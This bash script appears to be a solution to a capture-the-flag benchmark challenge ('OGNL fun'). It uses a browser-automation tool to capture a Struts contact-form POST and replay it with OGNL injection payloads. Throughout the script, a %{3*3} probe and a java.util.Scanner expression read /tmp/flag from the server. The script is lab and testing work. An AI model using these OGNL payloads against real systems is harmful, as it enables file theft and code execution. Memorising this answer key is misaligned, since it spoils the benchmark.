#!/usr/bin/env bash
# XBEN-035-24 — "OGNL fun" (tags: command_injection)
#
# A Struts action passes its own parameter through
# `TextParseUtil.translateVariables` after turning method execution back on, so
# anything in `%{…}` is evaluated as OGNL against the value stack. That is a
# language, not a string: `%{3*3}` renders `9`, and a `java.util.Scanner` reads
# the flag off disk.
#
# The interesting h5i part is the loop, not the payload. The form is submitted
# once to capture the POST, and every candidate after that is a `--set` on the
# stored request: no re-navigating, no re-filling the textarea, no session to
# rebuild. Each attempt is its own receipt, so the sequence of things tried is
# in the audit afterwards.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben035-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

# 1. Submit the contact form once, to have the real POST stored. The action
#    URL carries a jsessionid, which is one more reason not to type it by hand.
"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null
"$H5I" browser type --selector "#sendMessageAction_message" 'hello' --session "$SESSION" >/dev/null
"$H5I" browser click --selector "#sendMessageAction_0" --session "$SESSION" >/dev/null

SEQ="$("$H5I" websec requests --method POST --session "$SESSION" |
    python3 -c 'import json,sys; print(json.load(sys.stdin)["requests"][0]["seq"])')"

# 2. Confirm the expression language is live before reaching for a file. A
#    payload that fails on a target with no OGNL and a payload that fails
#    because the file is elsewhere look identical without this step.
PROBE="$("$H5I" websec replay "req_$SEQ" --set 'form.message=%{3*3}' --session "$SESSION" |
    python3 -c 'import json,sys; print(json.load(sys.stdin)["seq"])')"
"$H5I" websec match "res_$PROBE" --contains '<p>9</p>' --session "$SESSION" >/dev/null || {
    echo "OGNL did not evaluate; the target is not what this expects" >&2; exit 1; }

# 3. Read the flag file through the same expression language.
READ='%{new java.util.Scanner(new java.io.File("/tmp/flag")).useDelimiter("\\Z").next()}'
REPLAY="$("$H5I" websec replay "req_$SEQ" --set "form.message=$READ" --session "$SESSION" |
    python3 -c 'import json,sys; print(json.load(sys.stdin)["seq"])')"

"$H5I" websec match "res_$REPLAY" --regex 'FLAG\{[a-f0-9]{64}\}' --session "$SESSION" |
    python3 -c 'import json,sys; d=json.load(sys.stdin); print(d["conditions"][0]["captures"][0] if d["matched"] else "no flag found")'
